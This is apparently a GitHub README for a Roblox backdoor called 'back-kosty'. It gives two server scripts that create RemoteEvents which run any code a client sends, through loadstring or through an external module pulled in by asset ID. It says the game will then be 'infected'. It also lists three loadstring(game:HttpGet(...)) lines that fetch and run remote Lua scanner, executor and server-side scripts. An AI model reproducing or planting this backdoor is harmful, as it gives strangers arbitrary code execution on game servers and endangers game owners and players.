# back-kosty
repository of my backdoor for test also this so epic :D
# how to install?
create in serverscriptservice the 2 scripts
# stape number 1
local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
backdoor.Name = "back-kosty"
backdoor.OnServerEvent:connect(function(player, SS)
	loadstring(SS)()
end)

# stape 2

local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
backdoor.Name = "polaria"

backdoor.OnServerEvent:Connect(function(player, SS)
	local module = require(123255432303221)
	if type(SS) == "string" then
		module:Pload(SS)
	else
		warn("polaria failed")
	end
end)

# after that your game will be infected by back-kosty
# loadstring 1 (SERVERSIDE)
loadstring(game:HttpGet("(https://raw.githubusercontent.com/Kostyosthesystem/back-kosty/refs/heads/main/scanner.lua)")()
# loadstring 2 (LOCAL)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kostyosthesystem/back-kosty/refs/heads/main/executor/executorandhub.lua", true))()
# loadstring 3 (SERVERSIDE IN F3X)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kostyosthesystem/back-kosty/refs/heads/main/server-side/project%20360%20(ONLY%20F3X%20GAMES).lua", true)()
